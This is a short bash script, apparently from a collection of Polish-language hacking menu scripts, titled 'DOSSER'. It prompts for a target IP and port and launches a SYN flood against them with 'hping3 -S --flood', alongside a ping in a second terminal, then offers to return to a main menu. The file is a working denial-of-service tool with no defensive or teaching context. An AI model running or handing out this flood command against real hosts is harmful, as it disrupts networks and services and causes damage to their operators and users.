#! /bin/bash
figlet "DOSSER" | lolcat
read -r -p "Wprowadź IP celu - " IP
read -r -p "Wprowadź port celu - " PORT
gnome-terminal -- sudo ping $IP
sudo hping3 -S --flood -V -p $PORT $IP
while true
do
 read -r -p "Uruchomić skrypt ponownie ? (y/n) - " start
 
 case $start in
     [yY][eE][sS]|[yY])
  cd ..
  cd Scripts
  clear
  ./main.sh
 break
 ;;
     [nN][eE][sS]|[nN])
  echo "Dziękuje za skorzystanie ze skryptu !" | lolcat
  exit 1
 break
        ;;
     *)
 echo "Nieprawidłowa komenda"
  ;;
  esac
done
